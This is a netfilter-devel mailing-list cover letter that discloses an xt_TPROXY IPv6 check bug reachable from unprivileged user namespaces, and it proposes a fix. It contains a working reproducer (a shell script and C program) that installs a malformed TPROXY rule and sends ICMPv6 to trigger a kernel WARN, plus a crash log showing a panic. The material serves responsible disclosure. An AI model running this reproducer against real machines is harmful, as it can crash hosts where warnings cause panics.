Received: from mail-pf1-f175.google.com (mail-pf1-f175.google.com [209.85.210.175])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3FA851F63D9
	for <netfilter-devel@vger.kernel.org>; Mon, 17 Aug 2026 12:26:56 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.175
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786969618; cv=none; b=RdMEpj/aaNzgnC4zqUub62HAV27F1uOcB5/6SJkZLDD+k49UkTl2byFW6EHImQnupwnIJnRZWQBKX/mZOEFuN9CQIKTiUhj3bq+/zf5nJeKopTu5qi0K9A4xUBHz/WRBfOiczEuebetX+0f26L9x4UH+PCXHqDC0/Qu5dnZjvw0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786969618; c=relaxed/simple;
	bh=4yioiyimaMKV6+PZ8WuJh0YK7xcxAlA4oxxiI6i3xTk=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=E//3UoLXrFVacIkHt9D4YHjj03e64kwTeoZrPQhdBnT1Mk8+VV7WQeleaQ5zJn5PrZBv5WvaVIb7J2um7t5kHC7Tkk/fg/9Z0Ki5fc8tHkq5ibflH6rQQMVJTbK2RsC4ru5oWOeE1v4leLLOl5y8ORRYdU9glHPoOUITwGQOJx8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; arc=none smtp.client-ip=209.85.210.175
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Received: by mail-pf1-f175.google.com with SMTP id d2e1a72fcca58-848743155bcso949319b3a.0
        for <netfilter-devel@vger.kernel.org>; Mon, 17 Aug 2026 05:26:56 -0700 (PDT)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786969615; x=1787574415;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Lg2mZuWF3Rbb4AO2TXwRlFXmblm9E6t7ko0bXVpFf8w=;
        b=rysz0Kh95tDwJUanBZdIDL6egAjmF/rQgfMFRt0sIeh2b+jbac8Sq4FJ1BP/sleGCx
         jpiB+L5esccNJ6+2Z/C9Y0ny/g9PeucnAnUmXvvitqk0qiMHrob9DreYfQsHyjCxnhc1
         ulvn0NDzrZlm/B0eJPXEnZmWZndRICnB7iAWDI3LEFfo+CGxoGPvysQWDvy7/HgzB+l6
         a2t7Dkh6GgkZSrgXKJKW39ZUpz0Oi2JJbX9aw2nhwLaLAHcltJAOTsZ7PVt7anHHM9nz
         VrLFHWJl0cdTn04eufvU3CHD58b2LBuaRddNvBtDbckeJ7bewN8GKdc+nGrVzH/Oisez
         kATg==
X-Gm-Message-State: AOJu0YwJL3fNmTvbVrcq9CqoCCMouVqwNPSdsVH0KHFYPSb7ojlfWEi+
	87tl1JXrGxfkV+DBtjbGTsUF4dwc0CUh7pRBEbDDQ6+3Zp/eehh/5YQx+q7X+8EV7rLQbDsBSUF
	s2WTwYuweLfWzAg==
X-Gm-Gg: AR+sD11zrt1e1poYgwXYdwe7Uw3BPe84VXNYgpXuKPPGnVCKulJy1doDs5fncHKZ5kx
	AqEc1j2et1einhko39LrQ/FWifH/e62wXDMw7P5/ff1/+t1aLpwuW8f1i4GjGOPLPaPWXpaEkT9
	k2m+A5AwfD8KpfdfYdYbmdCP11eoKIN2X6q2Ng3nrgdjy2zQ3NEE/VDN6qJWWcmP71gBI56OAPM
	K+d7mDeatVSJ28/2ZVTsICzeyomQyFWznxAwWto2joMCxJ/F9MCt36KyWvHdIEWJFsJGuIQFD8H
	bhUt1kg6zTjCDEiUCRX5adGn9BlLrDzjkYYsT2Z0XRJ1fpyZ7KQKmMLzNTK69+zXA86AWIR1Ui1
	KQv8RNlOcknhxb5g/QalLpzSuB4h0i6bmjN5POfHw6GEkaoPo4jgXjdR4xMPBpeW7WEeOQiGTp6
	uvd0R0XJ5raNs8fBHGQGJvLFnlQihrj/JYcMrVXwqQmdsh/hbNeegk5ipoGYx52pX+2M1K9LroQ
	Prz9EMSZo0=
X-Received: by 2002:a05:6a00:3698:b0:848:42a7:1854 with SMTP id d2e1a72fcca58-84fde32cc98mr26055643b3a.39.1786969614908;
        Mon, 17 Aug 2026 05:26:54 -0700 (PDT)
Received: from Roxy.localdomain (n220246089185.netvigator.com. [220.246.89.185])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-851b407294fsm465580b3a.25.2026.08.17.05.26.50
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 17 Aug 2026 05:26:53 -0700 (PDT)
From: Zhiling Zou zhilinz@nebusec.ai
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	bazsi@balabit.hu,
	kaber@trash.net,
	hidden@balabit.hu,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: xt_TPROXY: require IPv6 protocol match
Date: Mon, 17 Aug 2026 20:26:36 +0800
Message-ID: <cover.1786968834.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/xt_TPROXY.c. The bug is
reachable by a non-root user through a new user and network namespace
with CAP_NET_ADMIN in that namespace.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

tproxy_tg6_check() accepts an IPv6 TPROXY rule when its protocol field
is TCP or UDP even if IP6T_F_PROTO is clear. ip6_packet_match() only
uses this field when IP6T_F_PROTO is set, so the accepted rule matches
all protocols. ICMPv6 can then reach tproxy_tg6_v1(), which passes the
unsupported protocol to nf_tproxy_get_sock_v6(). Its default case
executes WARN_ON(1) for both the established and listener lookups.

Require IP6T_F_PROTO in tproxy_tg6_check() so that only TCP/UDP packets
can reach the TPROXY target.

Reproducer:

    make clean all
    sysctl -w kernel.panic_on_warn=1
    ./poc.sh userns

------BEGIN poc.sh------

#!/bin/bash
set -euo pipefail

DIR=$(cd -- "$(dirname -- "$0")" && pwd)
RECV_IF=${RECV_IF:-tprx0}
SEND_IF=${SEND_IF:-tprx1}
RECV_ADDR=${RECV_ADDR:-2001:db8:1::1}
SEND_ADDR=${SEND_ADDR:-2001:db8:1::2}
MODE=${1:-root}
PEER_PID=""

cleanup() {
	if [[ -n "$PEER_PID" ]]; then
		kill "$PEER_PID" 2>/dev/null || true
		wait "$PEER_PID" 2>/dev/null || true
	fi
	ip link del "$RECV_IF" 2>/dev/null || true
}

inner() {
	trap cleanup EXIT
	cd "$DIR"
	make clean all

	ip link set lo up
	unshare -n -- bash -c 'sleep 10000' &
	PEER_PID=$!
	sleep 0.2

	ip link add "$RECV_IF" type veth peer name "$SEND_IF"
	ip link set "$SEND_IF" netns "$PEER_PID"
	ip -6 addr add "${RECV_ADDR}/64" dev "$RECV_IF" nodad
	ip link set "$RECV_IF" up
	nsenter -t "$PEER_PID" -n ip link set lo up
	nsenter -t "$PEER_PID" -n ip -6 addr add "${SEND_ADDR}/64" dev "$SEND_IF" nodad
	nsenter -t "$PEER_PID" -n ip link set "$SEND_IF" up

	./poc --install "$RECV_IF" "$RECV_ADDR"
	./poc --send "/proc/$PEER_PID/ns/net" "$SEND_IF" "$SEND_ADDR" "$RECV_ADDR"
	sleep 1
}

case "$MODE" in
root)
	exec unshare -n -- "$0" __inner
	;;
userns)
	exec unshare -Urn -- "$0" __inner
	;;
__inner)
	inner
	;;
*)
	echo "usage: $0 [root|userns]" >&2
	exit 2
	;;
esac

------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netfilter.h>
#include <linux/netfilter/x_tables.h>
#include <linux/netfilter/xt_TPROXY.h>
#include <linux/netfilter_ipv6/ip6_tables.h>
#include <netinet/icmp6.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define TABLE_NAME "mangle"

static void die(const char *what)
{
	perror(what);
	exit(1);
}

static void die_msg(const char *what)
{
	fprintf(stderr, "%s\n", what);
	exit(1);
}

static void fill_ifname(char name[IFNAMSIZ], unsigned char mask[IFNAMSIZ],
			const char *ifname)
{
	size_t len = strlen(ifname);

	if (len >= IFNAMSIZ)
		die_msg("interface name too long");

	memset(name, 0, IFNAMSIZ);
	memset(mask, 0, IFNAMSIZ);
	memcpy(name, ifname, len);
	memset(mask, 0xff, len);
}

static void init_standard_accept(struct ip6t_entry *entry)
{
	struct xt_standard_target *target;

	memset(entry, 0, sizeof(*entry) + XT_ALIGN(sizeof(*target)));
	entry->target_offset = sizeof(*entry);
	entry->next_offset = sizeof(*entry) + XT_ALIGN(sizeof(*target));

	target = (struct xt_standard_target *)entry->elems;
	memset(target, 0, XT_ALIGN(sizeof(*target)));
	target->target.u.user.target_size = XT_ALIGN(sizeof(*target));
	target->verdict = -NF_ACCEPT - 1;
}

static void init_bad_rule(struct ip6t_entry *entry, const char *ifname,
			  const char *dst_addr)
{
	struct xt_entry_target *target;
	struct xt_tproxy_target_info_v1 *info;
	struct in6_addr dst;
	unsigned int target_size =
		XT_ALIGN(sizeof(struct xt_entry_target) + sizeof(*info));

	memset(entry, 0, sizeof(*entry) + target_size);
	entry->target_offset = sizeof(*entry);
	entry->next_offset = sizeof(*entry) + target_size;

	if (inet_pton(AF_INET6, dst_addr, &dst) != 1)
		die_msg("invalid destination address");

	entry->ipv6.proto = IPPROTO_TCP;
	memcpy(&entry->ipv6.dst, &dst, sizeof(dst));
	memset(&entry->ipv6.dmsk, 0xff, sizeof(entry->ipv6.dmsk));
	fill_ifname(entry->ipv6.iniface, entry->ipv6.iniface_mask, ifname);

	target = (struct xt_entry_target *)entry->elems;
	memset(target, 0, target_size);
	target->u.user.target_size = target_size;
	strncpy(target->u.user.name, "TPROXY", sizeof(target->u.user.name) - 1);
	target->u.user.revision = 1;

	info = (struct xt_tproxy_target_info_v1 *)target->data;
	memset(info, 0, sizeof(*info));
}

static int open_xtables_socket(void)
{
	int fd = socket(AF_INET6, SOCK_STREAM, 0);

	if (fd < 0)
		die("socket(AF_INET6)");
	return fd;
}

static void get_table_info(int fd, struct ip6t_getinfo *info)
{
	socklen_t len = sizeof(*info);

	memset(info, 0, sizeof(*info));
	strncpy(info->name, TABLE_NAME, sizeof(info->name) - 1);
	if (getsockopt(fd, SOL_IPV6, IP6T_SO_GET_INFO, info, &len) < 0)
		die("getsockopt(IP6T_SO_GET_INFO)");
}

static unsigned int count_bits(unsigned int value)
{
	unsigned int count = 0;

	while (value) {
		count += value & 1U;
		value >>= 1;
	}

	return count;
}

static int install_rule(const char *ifname, const char *dst_addr)
{
	struct ip6t_getinfo info;
	struct ip6t_replace *repl;
	struct xt_counters *counters;
	struct ip6t_entry *entry;
	unsigned int accept_size = sizeof(struct ip6t_entry) +
				   XT_ALIGN(sizeof(struct xt_standard_target));
	unsigned int bad_size = sizeof(struct ip6t_entry) +
				XT_ALIGN(sizeof(struct xt_entry_target) +
					 sizeof(struct xt_tproxy_target_info_v1));
	unsigned int hook_count;
	unsigned int total_entries;
	unsigned int total_size;
	unsigned int offset = 0;
	int fd;
	int prerouting_seen = 0;
	unsigned int hook;

	fd = open_xtables_socket();
	get_table_info(fd, &info);

	hook_count = count_bits(info.valid_hooks);
	if (!(info.valid_hooks & (1U << NF_INET_PRE_ROUTING)))
		die_msg("mangle table does not expose PREROUTING in this namespace");

	total_entries = hook_count + 1;
	total_size = bad_size + hook_count * accept_size;

	repl = calloc(1, sizeof(*repl) + total_size);
	if (!repl)
		die("calloc(repl)");

	counters = calloc(info.num_entries, sizeof(*counters));
	if (!counters)
		die("calloc(counters)");

	strncpy(repl->name, TABLE_NAME, sizeof(repl->name) - 1);
	repl->valid_hooks = info.valid_hooks;
	repl->num_entries = total_entries;
	repl->size = total_size;
	repl->num_counters = info.num_entries;
	repl->counters = counters;

	for (hook = 0; hook < NF_INET_NUMHOOKS; hook++) {
		if (!(info.valid_hooks & (1U << hook)))
			continue;

		if (hook == NF_INET_PRE_ROUTING) {
			entry = (struct ip6t_entry *)((char *)repl->entries + offset);
			init_bad_rule(entry, ifname, dst_addr);
			repl->hook_entry[hook] = offset;
			offset += entry->next_offset;
			prerouting_seen = 1;
		}

		entry = (struct ip6t_entry *)((char *)repl->entries + offset);
		init_standard_accept(entry);
		if (hook == NF_INET_PRE_ROUTING)
			repl->underflow[hook] = offset;
		else
			repl->hook_entry[hook] = repl->underflow[hook] = offset;
		offset += entry->next_offset;
	}

	if (!prerouting_seen)
		die_msg("PREROUTING rule was not emitted");
	if (offset != total_size)
		die_msg("internal size mismatch while building replacement table");

	if (setsockopt(fd, SOL_IPV6, IP6T_SO_SET_REPLACE,
		       repl, sizeof(*repl) + repl->size) < 0)
		die("setsockopt(IP6T_SO_SET_REPLACE)");

	printf("installed malformed IPv6 TPROXY rule on %s for %s\n",
	       ifname, dst_addr);

	free(counters);
	free(repl);
	close(fd);
	return 0;
}

static int open_icmp6_socket(void)
{
	int fd;
	int csum = 2;

	fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
	if (fd >= 0)
		return fd;

	fd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
	if (fd < 0)
		die("socket(ICMPv6)");
	if (setsockopt(fd, IPPROTO_IPV6, IPV6_CHECKSUM, &csum, sizeof(csum)) < 0 &&
	    errno != EINVAL)
		die("setsockopt(IPV6_CHECKSUM)");
	return fd;
}

static int send_packet(const char *netns_path, const char *ifname,
		       const char *src_addr, const char *dst_addr)
{
	struct sockaddr_in6 src = { 0 };
	struct sockaddr_in6 dst = { 0 };
	struct {
		struct icmp6_hdr hdr;
		uint8_t payload[8];
	} pkt;
	int nsfd;
	int fd;

	nsfd = open(netns_path, O_RDONLY);
	if (nsfd < 0)
		die("open(netns)");
	if (setns(nsfd, CLONE_NEWNET) < 0)
		die("setns(CLONE_NEWNET)");
	close(nsfd);

	fd = open_icmp6_socket();
	if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE,
		       ifname, strlen(ifname) + 1) < 0)
		die("setsockopt(SO_BINDTODEVICE)");

	src.sin6_family = AF_INET6;
	if (inet_pton(AF_INET6, src_addr, &src.sin6_addr) != 1)
		die_msg("invalid source address");
	if (bind(fd, (struct sockaddr *)&src, sizeof(src)) < 0)
		die("bind(source)");

	dst.sin6_family = AF_INET6;
	if (inet_pton(AF_INET6, dst_addr, &dst.sin6_addr) != 1)
		die_msg("invalid destination address");

	memset(&pkt, 0, sizeof(pkt));
	pkt.hdr.icmp6_type = ICMP6_ECHO_REQUEST;
	pkt.hdr.icmp6_id = htons(0x1234);
	pkt.hdr.icmp6_seq = htons(1);
	memcpy(pkt.payload, "TPROXYV3", sizeof(pkt.payload));

	if (sendto(fd, &pkt, sizeof(pkt), 0,
		   (struct sockaddr *)&dst, sizeof(dst)) < 0)
		die("sendto(ICMPv6)");

	printf("sent ICMPv6 echo from %s to %s via %s\n",
	       src_addr, dst_addr, ifname);
	close(fd);
	return 0;
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage:\n"
		"  %s --install <recv-if> <recv-addr>\n"
		"  %s --send <netns> <send-if> <src-addr> <dst-addr>\n",
		prog, prog);
	exit(2);
}

int main(int argc, char **argv)
{
	if (argc == 4 && strcmp(argv[1], "--install") == 0)
		return install_rule(argv[2], argv[3]);
	if (argc == 6 && strcmp(argv[1], "--send") == 0)
		return send_packet(argv[2], argv[3], argv[4], argv[5]);
	usage(argv[0]);
}

------END poc.c--------

----BEGIN crash log----

[  365.204811][    C0] ------------[ cut here ]------------
[  365.205990][    C0] WARNING: CPU: 0 PID: 1101 at net/ipv6/netfilter/nf_tproxy_ipv6.c:140 nf_tproxy_get_sock_v6+0xd5/0x7a0
[  365.208021][    C0] Modules linked in:
[  365.208771][    C0] CPU: 0 UID: 1028 PID: 1101 Comm: poc Tainted: G        W          6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  365.210949][    C0] Tainted: [W]=WARN
[  365.211664][    C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  365.213751][    C0] RIP: 0010:nf_tproxy_get_sock_v6+0xd5/0x7a0
[  365.214841][    C0] Code: 31 c0 48 89 f8 48 c1 e8 03 80 3c 10 00 0f 85 d1 05 00 00 4c 8b 95 80 05 00 00 41 80 fe 06 0f 84 98 01 00 00 41 80 fe 11 74 5d <0f> 0b 31 ed f6 05 7b c4 f0 03 01 0f 85 54 04 00 00 48 b8 00 00 00
[  365.218086][    C0] RSP: 0018:ffffc900000075e8 EFLAGS: 00010202
[  365.219199][    C0] RAX: 1ffff11021dd7718 RBX: 1ffff92000000ec5 RCX: 000000000000003a
[  365.220602][    C0] RDX: dffffc0000000000 RSI: 0000000000000028 RDI: ffff88810eebb8c0
[  365.221965][    C0] RBP: ffff88810eebb340 R08: ffff8881123c4000 R09: ffff888107368430
[  365.223345][    C0] R10: ffffffff8bbde600 R11: 000000000000003a R12: 000000000000dcbc
[  365.224556][    C0] R13: 0000000000000080 R14: 000000000000003a R15: ffff888102e6fe00
[  365.225708][    C0] FS:  000078ed107b6740(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
[  365.227211][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  365.228329][    C0] CR2: 000078ed108e07c0 CR3: 0000000011578002 CR4: 0000000000770ef0
[  365.229462][    C0] PKRU: 55555554
[  365.230082][    C0] Call Trace:
[  365.230710][    C0]  <IRQ>
[  365.231213][    C0]  ? __pfx_nf_tproxy_get_sock_v6+0x10/0x10
[  365.232262][    C0]  ? kasan_save_track+0x17/0x60
[  365.233188][    C0]  ? kasan_save_free_info+0x3b/0x60
[  365.234116][    C0]  ? __kasan_slab_free+0x37/0x50
[  365.235013][    C0]  ? memcg_alloc_abort_single+0xc0/0x320
[  365.236047][    C0]  ? icmpv6_rcv+0x97f/0x1530
[  365.236897][    C0]  ? ip6_protocol_deliver_rcu+0xb97/0x12e0
[  365.237947][    C0]  ? ip6_input_finish+0x14b/0x1f0
[  365.238864][    C0]  ? ip6_input+0x1d4/0x200
[  365.239682][    C0]  ? ipv6_rcv+0x327/0x460
[  365.240401][    C0]  ? __netif_receive_skb_one_core+0x11a/0x1b0
[  365.241545][    C0]  ? process_backlog+0x33c/0xf00
[  365.242364][    C0]  ? __napi_poll.constprop.0+0xa7/0x580
[  365.243339][    C0]  ? net_rx_action+0x4d4/0xc70
[  365.244103][    C0]  ? handle_softirqs+0x282/0x7d0
[  365.244838][    C0]  ? do_softirq.part.0+0x3f/0xa0
[  365.245387][    C0]  ? __local_bh_enable_ip+0x79/0x80
[  365.246041][    C0]  tproxy_tg6_v1+0x2ea/0xbc0
[  365.246683][    C0]  ? __pfx_tproxy_tg6_v1+0x10/0x10
[  365.247290][    C0]  ip6t_do_table+0x9bc/0x1ae0
[  365.248009][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.248919][    C0]  ? nf_ct_frag6_gather+0x314/0x26a0
[  365.249730][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.250559][    C0]  ? find_held_lock+0x34/0x120
[  365.251257][    C0]  ? __pfx_ip6t_do_table+0x10/0x10
[  365.252046][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.252905][    C0]  ? __pfx_nf_ct_frag6_gather+0x10/0x10
[  365.253741][    C0]  ? lock_release+0x687/0xc90
[  365.254416][    C0]  ip6table_mangle_hook+0xaa/0x710
[  365.255192][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.256038][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.256916][    C0]  ? local_clock_noinstr+0x15/0xd0
[  365.257734][    C0]  ? __pfx_ip6table_mangle_hook+0x10/0x10
[  365.258605][    C0]  ? ipv6_defrag+0x197/0x3d0
[  365.259255][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.260103][    C0]  nf_hook_slow+0xa9/0x1e0
[  365.260815][    C0]  ipv6_rcv+0x16d/0x460
[  365.261402][    C0]  ? kasan_save_stack+0x42/0x60
[  365.262151][    C0]  ? __pfx_ipv6_rcv+0x10/0x10
[  365.262770][    C0]  ? __kasan_slab_free+0x37/0x50
[  365.263170][    C0]  ? kmem_cache_free+0x1a5/0x570
[  365.263609][    C0]  ? rcu_core+0x706/0x1e50
[  365.263996][    C0]  ? __pfx_ip6_rcv_finish+0x10/0x10
[  365.264418][    C0]  ? find_held_lock+0x34/0x120
[  365.264846][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.265294][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.265768][    C0]  ? local_clock_noinstr+0x15/0xd0
[  365.266184][    C0]  ? __pfx_ipv6_rcv+0x10/0x10
[  365.266592][    C0]  __netif_receive_skb_one_core+0x11a/0x1b0
[  365.267078][    C0]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  365.267620][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.268084][    C0]  ? process_backlog+0x309/0xf00
[  365.268481][    C0]  ? process_backlog+0x309/0xf00
[  365.268927][    C0]  ? process_backlog+0x309/0xf00
[  365.269330][    C0]  process_backlog+0x33c/0xf00
[  365.269763][    C0]  ? process_backlog+0x309/0xf00
[  365.270176][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.270679][    C0]  __napi_poll.constprop.0+0xa7/0x580
[  365.271115][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.271606][    C0]  net_rx_action+0x4d4/0xc70
[  365.271997][    C0]  ? __pfx_net_rx_action+0x10/0x10
[  365.272411][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.272891][    C0]  ? lock_release+0x687/0xc90
[  365.273273][    C0]  ? __pfx_lock_release+0x10/0x10
[  365.273704][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.274143][    C0]  ? ktime_get+0x6f/0x150
[  365.274547][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.275012][    C0]  handle_softirqs+0x282/0x7d0
[  365.275406][    C0]  ? __pfx_handle_softirqs+0x10/0x10
[  365.275865][    C0]  do_softirq.part.0+0x3f/0xa0
[  365.276252][    C0]  </IRQ>
[  365.276484][    C0]  <TASK>
[  365.276756][    C0]  __local_bh_enable_ip+0x79/0x80
[  365.277160][    C0]  __neigh_event_send+0x2ce/0x11c0
[  365.277624][    C0]  ? __lock_acquire.isra.0+0x5cb/0x1230
[  365.278079][    C0]  neigh_resolve_output+0x435/0x740
[  365.278506][    C0]  ? __pfx____neigh_create+0x10/0x10
[  365.278951][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.279398][    C0]  ip6_finish_output2+0x933/0x1c00
[  365.279859][    C0]  ? lock_release+0x687/0xc90
[  365.280231][    C0]  ? __pfx_ip6_finish_output2+0x10/0x10
[  365.280698][    C0]  ? lock_acquire+0x153/0x2f0
[  365.281075][    C0]  ? ip6_mtu+0x7e/0x240
[  365.281410][    C0]  ip6_finish_output+0x6af/0xd00
[  365.281856][    C0]  ip6_output+0x203/0x5f0
[  365.282211][    C0]  ? __pfx_ip6_output+0x10/0x10
[  365.282633][    C0]  ? ip6_setup_cork+0xa56/0x15a0
[  365.283028][    C0]  ? __pfx_ip6_finish_output+0x10/0x10
[  365.283462][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.283949][    C0]  ip6_send_skb+0xdc/0x290
[  365.284306][    C0]  rawv6_sendmsg+0x25d8/0x35a0
[  365.284724][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.285186][    C0]  ? __pfx_rawv6_sendmsg+0x10/0x10
[  365.285633][    C0]  ? release_sock+0x1f/0x180
[  365.286013][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.286452][    C0]  ? reacquire_held_locks+0x204/0x4b0
[  365.286918][    C0]  ? release_sock+0x1f/0x180
[  365.287302][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.287785][    C0]  ? aa_sk_perm+0x131/0x8a0
[  365.288186][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.288683][    C0]  ? __sys_sendto+0x361/0x3f0
[  365.289055][    C0]  __sys_sendto+0x361/0x3f0
[  365.289395][    C0]  ? __pfx___sys_sendto+0x10/0x10
[  365.289826][    C0]  ? __pfx_inet6_bind_sk+0x10/0x10
[  365.290234][    C0]  ? do_user_addr_fault+0x45b/0xbc0
[  365.290709][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.291143][    C0]  ? __sys_bind+0x169/0x200
[  365.291552][    C0]  __x64_sys_sendto+0xe0/0x1c0
[  365.291928][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.292374][    C0]  ? trace_hardirqs_on+0x5b/0x110
[  365.292824][    C0]  do_syscall_64+0x6f/0x150
[  365.293200][    C0]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  365.293697][    C0] RIP: 0033:0x78ed10848687
[  365.294073][    C0] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  365.295623][    C0] RSP: 002b:00007ffff31d9530 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  365.296289][    C0] RAX: ffffffffffffffda RBX: 000078ed107b6740 RCX: 000078ed10848687
[  365.297031][    C0] RDX: 0000000000000010 RSI: 00007ffff31d9610 RDI: 0000000000000003
[  365.297692][    C0] RBP: 00007ffff31daee7 R08: 00007ffff31d95f0 R09: 000000000000001c
[  365.298303][    C0] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffff31daeed
[  365.298957][    C0] R13: 00007ffff31daefb R14: 00007ffff31d95f0 R15: 00005d018ed30dd8
[  365.299643][    C0]  </TASK>
[  365.299897][    C0] Kernel panic - not syncing: kernel: panic_on_warn set ...
[  365.300509][    C0] CPU: 0 UID: 1028 PID: 1101 Comm: poc Tainted: G        W          6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  365.301514][    C0] Tainted: [W]=WARN
[  365.301822][    C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  365.302812][    C0] Call Trace:
[  365.303074][    C0]  <IRQ>
[  365.303300][    C0]  panic+0x544/0x620
[  365.303635][    C0]  ? __pfx_panic+0x10/0x10
[  365.304009][    C0]  ? nf_tproxy_get_sock_v6+0xd5/0x7a0
[  365.304443][    C0]  check_panic_on_warn+0x61/0x80
[  365.304845][    C0]  __warn+0xdd/0x2d0
[  365.305155][    C0]  ? nf_tproxy_get_sock_v6+0xd5/0x7a0
[  365.305591][    C0]  report_bug+0x253/0x2b0
[  365.305942][    C0]  handle_bug+0x10a/0x180
[  365.306287][    C0]  exc_invalid_op+0x17/0x40
[  365.306671][    C0]  asm_exc_invalid_op+0x1a/0x20
[  365.307134][    C0] RIP: 0010:nf_tproxy_get_sock_v6+0xd5/0x7a0
[  365.307909][    C0] Code: 31 c0 48 89 f8 48 c1 e8 03 80 3c 10 00 0f 85 d1 05 00 00 4c 8b 95 80 05 00 00 41 80 fe 06 0f 84 98 01 00 00 41 80 fe 11 74 5d <0f> 0b 31 ed f6 05 7b c4 f0 03 01 0f 85 54 04 00 00 48 b8 00 00 00
[  365.310915][    C0] RSP: 0018:ffffc900000075e8 EFLAGS: 00010202
[  365.311915][    C0] RAX: 1ffff11021dd7718 RBX: 1ffff92000000ec5 RCX: 000000000000003a
[  365.313059][    C0] RDX: dffffc0000000000 RSI: 0000000000000028 RDI: ffff88810eebb8c0
[  365.314201][    C0] RBP: ffff88810eebb340 R08: ffff8881123c4000 R09: ffff888107368430
[  365.315353][    C0] R10: ffffffff8bbde600 R11: 000000000000003a R12: 000000000000dcbc
[  365.316504][    C0] R13: 0000000000000080 R14: 000000000000003a R15: ffff888102e6fe00
[  365.317681][    C0]  ? __pfx_lock_release+0x10/0x10
[  365.318422][    C0]  ? __pfx_nf_tproxy_get_sock_v6+0x10/0x10
[  365.319268][    C0]  ? kasan_save_track+0x17/0x60
[  365.319975][    C0]  ? kasan_save_free_info+0x3b/0x60
[  365.320725][    C0]  ? __kasan_slab_free+0x37/0x50
